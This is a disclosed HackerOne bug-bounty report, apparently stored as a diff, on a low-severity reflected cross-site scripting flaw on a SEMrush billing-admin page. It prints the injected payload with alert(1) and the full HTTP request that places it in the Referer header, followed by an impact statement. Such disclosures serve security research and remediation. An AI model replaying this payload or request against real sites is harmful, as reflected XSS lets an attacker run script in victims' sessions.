@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/297203
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/inferno-
+ReportedTo:SEMrush(semrush)
+BountyAmount:100.0
+Severity:low
+State:Closed
+DateOfDisclosure:18.01.2018 18:57:11
+
+Summary:
+
+Host : www.semrush.com
+
+Path : /billing-admin/profile/subscription/?l=de
+
+Payload : c5obc'+alert(1)+'p7yd5
+
+Steps to reproduce :
+
+Request Header :
+
+GET /billing-admin/profile/subscription/?l=de HTTP/1.1
+Host: www.semrush.com
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5
+
+Overview :
+
+The payload c5obc'+alert(1)+'p7yd5 was submitted in the Referer HTTP header. Payload is copied from a request and echoed into the application's immediate response in an unsafe way.
+
+## Impact
+
+Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.
